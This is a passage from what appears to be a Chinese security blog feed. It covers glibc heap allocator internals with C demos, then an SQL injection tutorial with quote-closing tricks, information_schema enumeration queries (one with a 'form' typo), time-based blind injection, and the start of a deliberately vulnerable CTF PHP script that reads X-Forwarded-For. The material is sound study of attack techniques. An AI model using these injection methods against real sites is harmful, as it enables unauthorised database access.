class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点使用，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>打断点 看堆信息</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141039796.png" alt="image-20201216141039796"></p><p>释放p1 看到进入fastbin中</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141113312.png" alt="image-20201216141113312"></p><p>分配p2 可以看到我们p1好像是被覆盖了  我们具体来说一下这个过程</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141143610.png" alt="image-20201216141143610"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201216141159043.png" alt="image-20201216141159043"></p><p>当分配比small bin大的chunk时，我们就会触发consolidate，</p><ol><li>我们知道fastchunk是不会合并的 所以它们这时就会进入unsortedbin中</li><li>然后malloc去切割unsortedbin中的这个freechunk，发现不能够切割，于是就放入smallbin中，放入smallbin中之后便成为smallchunk了，就可以与topchunk合并了</li><li>合并之后malloc从topchunk中申请一个堆块</li></ol></blockquote><h4 id="5-演示二"><a href="#5-演示二" class="headerlink" title="5.演示二"></a>5.演示二</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点使用，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>释放p1和p</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216142837517.png" alt="image-20201216142837517"></p><p>下面我们猜想会发送什么?</p><p>由于分配chunk较大 所以我们会触发consolidate 这时两个fastchunk就会进入unsortedbin中 根据上面规则 它下一步就会进入small bins</p><p>又因为和top chunk相邻 所以top chunk会合并 </p><p>直观感觉就是我们覆盖了之前的chunk</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216143203315.png" alt="image-20201216143203315"></p></blockquote><h3 id="0x14-last-remainder"><a href="#0x14-last-remainder" class="headerlink" title="0x14 last remainder"></a>0x14 last remainder</h3><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h4><ul><li>如果在bins链中存在freechunk时，当我们去malloc的时候，malloc的请求大小比freechunk的大小小，那么arena就会切割这个freechunk给malloc使用，那么切割之后剩余的chunk就<strong>被称为“last remainder”</strong></li><li>当产生last remainder之后，表示arena的<strong>malloc_state结构体中的last_remainder成员</strong>指针就会<strong>被初始化</strong>，并且指向这个last remainder</li></ul><h4 id="2-产生场景"><a href="#2-产生场景" class="headerlink" title="2.产生场景"></a>2.产生场景</h4><ul><li>malloc的时候，不论malloc的大小，首先会去检查每个bins链（出去fastbins链）是否有与malloc相等大小的freechunk，如果没有就去检查bins链中是否有大的freechunk可以切割，如果切割，那么就切割大的freechunk，那么切割之后的chunk成为last remainder，并且last remainder会被放入到unsortedbin中</li></ul><blockquote><p><strong>切割unsortedbin中的大chunk时：</strong></p><p>当unsortedbin有对应的freechunk可以给malloc切割使用时，unsortedbin会发生以下步骤：</p><ul><li>①先将这些freechunk放置到对应大小的bins链上（放入smallbin或largebin）</li><li>②放置到对应的bins链上之后，切割此freechunk</li><li>③切割之后会产生last remainder，再将last remainder放到unsortedbin上</li></ul><p><strong>例如：</strong></p><ul><li>此时，unsortedbin有两个0x800的freechunk</li><li>此时申请一个0x600的chunk</li><li>那么unsortedbin会先consolidate，把两个0x800的freechunk先移动到largebin中</li><li>然后再切割largebin的freechunk，将切割后余留下的0x200放入unsortedbin</li></ul><p><strong>切割smallbins、largebins中的大chunk时：</strong></p><ul><li>①切割smallbins或者largebins中的大freechunk，产生last remainder</li><li>②将last remainder放入到unsortedbin中</li></ul></blockquote><h4 id="3-last-remainder的consolidate"><a href="#3-last-remainder的consolidate" class="headerlink" title="3.last remainder的consolidate"></a>3.last remainder的consolidate</h4><p>当我们切割一个bins链中的大chunk时产生last reminader时，会发生consolidate，<strong>但是此种consolidate不会去整理fastbins中的freechunk（重点）</strong></p><h4 id="4-演示一-1"><a href="#4-演示一-1" class="headerlink" title="4.演示一"></a>4.演示一</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span> = <span class="number">0x120</span>;</span><br><span class="line">    <span class="keyword">void</span> *p = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *junk = <span class="built_in">malloc</span>(<span class="built_in">size</span>);  <span class="comment">//放置释放p和q之后，p和q发生合并</span></span><br><span class="line">    <span class="keyword">void</span> *q = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *r = <span class="built_in">malloc</span>(<span class="built_in">size</span>);   <span class="comment">//放置释放q之后，q和topchunk发生合并</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p:0x%x\n"</span>,p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"q:0x%x\n"</span>,q);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"r:0x%x\n"</span>,r);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(p,<span class="string">"aaaaaaaabbbbbbbb"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(q,<span class="string">"ccccccccdddddddd"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(r,<span class="string">"eeeeeeeeffffffff"</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>断点</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216151435089.png" alt="image-20201216151435089"></p><p>释放p和q</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216151556927.png" alt="image-20201216151556927"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201216151633713.png" alt="image-20201216151633713"></p><p>分配0x90  </p><ul><li>首先两个unsortedbin chunk中可以分割到0x90那么就会consolidate 将其全部放入smallbins中</li><li>之后分割其中一部分 并将剩余的放入lastremainder</li></ul><p><img src="/2020/12/15/%E5%A0%86/image-20201216151705158.png" alt="image-20201216151705158"></p></blockquote><h4 id="5-演示二-1"><a href="#5-演示二-1" class="headerlink" title="5.演示二"></a>5.演示二</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">int</span> size2=<span class="number">0x200</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(size2);</span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//防止p2和p3都被释放之后，p2和p3发生合并</span></span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(size2);</span><br><span class="line">    <span class="keyword">int</span> *temp2=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//防止p3被释放之后与topchunk合并</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为打断点使用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接看释放p1 p2 p3</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216155717972.png" alt="image-20201216155717972"></p><p>这里继续想一下下一步会发生什么？</p><ul><li>分配大小0x100可以分配 那么就直接触发consolidate说明smallbin中就会有free chunk</li><li>lastremainder会放入unsortedbin中，此外fastfreechunk不会合并</li><li>那么我们就得到了</li></ul><p><img src="/2020/12/15/%E5%A0%86/image-20201216160152597.png" alt="image-20201216160152597"></p></blockquote><h4 id="6-演示三"><a href="#6-演示三" class="headerlink" title="6.演示三"></a>6.演示三</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x300</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);  <span class="comment">//防止p1被释放之后与topchunk合并</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//为了程序打断点使用，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x700</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接看p1释放后</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216160410739.png" alt="image-20201216160410739"></p><p>之后会分配0x700说明要分配较大的chunk 此时会被整理到smallbins中</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216160827250.png" alt="image-20201216160827250"></p><p>继续分配0x200 lastremainder会进入unsortedbin中</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216160910272.png" alt="image-20201216160910272"></p></blockquote><h4 id="7-演示四"><a href="#7-演示四" class="headerlink" title="7.演示四"></a>7.演示四</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x300</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//防止p1释放并consolidate到smallbins中之后，再释放p2导致p1和p2合并，合并之后又被放入unsortedbin中</span></span><br><span class="line">    <span class="keyword">int</span> *temp2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>); </span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);<span class="comment">//防止p2被释放之后与topchunk合并</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//为了程序打断点使用，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x700</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>先看堆信息</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216164710877.png" alt="image-20201216164710877"></p><p>释放p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216164747866.png" alt="image-20201216164747866"></p><p>分配0x700 由于unsorted bin中的chunk不够 所以直接从top chunk中分割</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216164913709.png" alt="image-20201216164913709"></p><p>free tmp和p2</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216165109899.png" alt="image-20201216165109899"></p><p>重点来看最后一步 这里，malloc(0x200)，此时malloc会切割smallbins中的p1，并产生last remainder（0x602250），并把last remainder放入到unsortedbin中。由于切割chunk并产生last remainder会发生consolidate，所以unsortedbin中的p2从unsortedbin中整理到smallbins中（由于此种情况的consolidate不会整理fastbins中的chunk，所以fastbins中的chunk仍然在fastbins中）</p><p><img src="/2020/12/15/%E5%A0%86/image-20201216165224983.png" alt="image-20201216165224983"></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;堆-持续更新&quot;&gt;&lt;a href=&quot;#堆-持续更新&quot; class=&quot;headerlink&quot; title=&quot;堆(持续更新)&quot;&gt;&lt;/a&gt;堆(持续更新)&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://ld1ng.com/2020/07/23/Heap/&quot; target=</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
    <category term="堆" scheme="https://pz1o.top/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="https://pz1o.top/2020/12/09/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://pz1o.top/2020/12/09/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-12-09T15:38:24.000Z</published>
    <updated>2020-12-09T15:39:32.233Z</updated>
    
    <content type="html"><![CDATA[<p>我就单纯想把这些东西存下来</p><h1 id="基础学习"><a href="#基础学习" class="headerlink" title="基础学习"></a>基础学习</h1><h2 id="1-SQL注入的分类"><a href="#1-SQL注入的分类" class="headerlink" title="1.SQL注入的分类"></a>1.SQL注入的分类</h2><ul><li><h3 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h3><ul><li><h4 id="基于错误的SQL注入"><a href="#基于错误的SQL注入" class="headerlink" title="基于错误的SQL注入"></a>基于错误的SQL注入</h4></li><li><h4 id="联合查询的类型"><a href="#联合查询的类型" class="headerlink" title="联合查询的类型"></a>联合查询的类型</h4></li><li><h4 id="堆查询注射"><a href="#堆查询注射" class="headerlink" title="堆查询注射"></a>堆查询注射</h4></li><li><h4 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h4><ul><li><h5 id="基于布尔SQL盲注"><a href="#基于布尔SQL盲注" class="headerlink" title="基于布尔SQL盲注"></a>基于布尔SQL盲注</h5></li><li><h5 id="基于时间的SQL盲注"><a href="#基于时间的SQL盲注" class="headerlink" title="基于时间的SQL盲注"></a>基于时间的SQL盲注</h5></li><li><h5 id="基于报错的SQL盲注"><a href="#基于报错的SQL盲注" class="headerlink" title="基于报错的SQL盲注"></a>基于报错的SQL盲注</h5></li></ul></li></ul></li></ul><ul><li><h3 id="基于如何处理输入的SQL查询"><a href="#基于如何处理输入的SQL查询" class="headerlink" title="基于如何处理输入的SQL查询"></a>基于如何处理输入的SQL查询</h3><ul><li><h5 id="基于字符串"><a href="#基于字符串" class="headerlink" title="基于字符串"></a>基于字符串</h5></li><li><h5 id="数字或整数"><a href="#数字或整数" class="headerlink" title="数字或整数"></a>数字或整数</h5></li></ul></li><li><h3 id="基于程度和顺序的注入"><a href="#基于程度和顺序的注入" class="headerlink" title="基于程度和顺序的注入"></a>基于程度和顺序的注入</h3><ul><li><h5 id="一阶注射"><a href="#一阶注射" class="headerlink" title="一阶注射"></a>一阶注射</h5></li><li><h5 id="二阶注射"><a href="#二阶注射" class="headerlink" title="二阶注射"></a>二阶注射</h5></li></ul></li><li><h3 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h3><ul><li><h5 id="通过用户输入的表单域的注射"><a href="#通过用户输入的表单域的注射" class="headerlink" title="通过用户输入的表单域的注射"></a>通过用户输入的表单域的注射</h5></li><li><h5 id="通过cookie注射"><a href="#通过cookie注射" class="headerlink" title="通过cookie注射"></a>通过cookie注射</h5></li><li><h5 id="通过服务器变量"><a href="#通过服务器变量" class="headerlink" title="通过服务器变量"></a>通过服务器变量</h5></li></ul></li></ul><h2 id="2-基础函数与逻辑"><a href="#2-基础函数与逻辑" class="headerlink" title="2.基础函数与逻辑"></a>2.基础函数与逻辑</h2><h3 id="1-基础函数"><a href="#1-基础函数" class="headerlink" title="1.基础函数"></a>1.基础函数</h3><p>​    concat(str1,str2)   ——无分隔连接字符串</p><p>​    concat_ws(separator,str1,str2)   ——含有分隔符连接字符串</p><p>​    group_concat(str1,str2)  ——以逗号分隔每一条数据，连接一个组的字符串</p><h3 id="2-基础逻辑"><a href="#2-基础逻辑" class="headerlink" title="2.基础逻辑"></a>2.基础逻辑</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"select * from users where id='$id' limit 0,1"</span>;</span><br></pre></td></tr></table></figure><p>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用—+ 或者 #（%23）。</p><p>limit 从0开始，至少1个数据</p><p>limit 10  至少10个数据</p><h3 id="3-union操作符的用法"><a href="#3-union操作符的用法" class="headerlink" title="3.union操作符的用法"></a>3.union操作符的用法</h3><p>union操作符用于合并两个或多个select语句的结果集。但注意的是，select的语句必须有相同数量的列，列也有相同的类型。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_names <span class="keyword">from</span> table_name1 <span class="keyword">union</span> <span class="keyword">select</span> column_names <span class="keyword">from</span> table_name2;</span><br></pre></td></tr></table></figure><h3 id="4-一般操作"><a href="#4-一般操作" class="headerlink" title="4.一般操作"></a>4.一般操作</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> information_schema; //进入系统数据库</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>; </span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'myclass'</span>; //搜索当数据库名为myclass中各表的名字</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502160256194.png" alt="image-20200502160256194"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata; //猜数据库</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span>; //猜某库的数据表</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">form</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'表名'</span>; //猜某表的数据段</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> *; //猜数据段的内容</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502161927164_WPS%E5%9B%BE%E7%89%87.png" alt="image-20200502161927164_WPS图片"></p><h2 id="3-盲注的讲解（先看1-4之后再来看）"><a href="#3-盲注的讲解（先看1-4之后再来看）" class="headerlink" title="3.盲注的讲解（先看1-4之后再来看）"></a>3.盲注的讲解（先看1-4之后再来看）</h2><h3 id="1-基于布尔的SQL盲注"><a href="#1-基于布尔的SQL盲注" class="headerlink" title="1.基于布尔的SQL盲注"></a>1.基于布尔的SQL盲注</h3><h3 id="2-基于时间的SQL盲注"><a href="#2-基于时间的SQL盲注" class="headerlink" title="2.基于时间的SQL盲注"></a>2.基于时间的SQL盲注</h3><p>时间盲注和布尔盲注非常类似，但时间盲注是利用sleep()​和benchmark()等函数让mysql执行的时间变长。</p><p>时间盲注多与IF(expr1,expr2,expr3)结合使用，如果expr1是true，则执行expr2，否则执行expr3</p><h3 id="INSERT-INTO注入-case延时盲注"><a href="#INSERT-INTO注入-case延时盲注" class="headerlink" title="INSERT INTO注入(case延时盲注)"></a>INSERT INTO注入(case延时盲注)</h3><p>看了源码知道取xff头,并且explode过滤逗号。题目的源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];  &#x2F;&#x2F;获取请求的ip地址</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip); &#x2F;&#x2F;将逗号过滤</span><br><span class="line">return $ip_arr[0]; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is 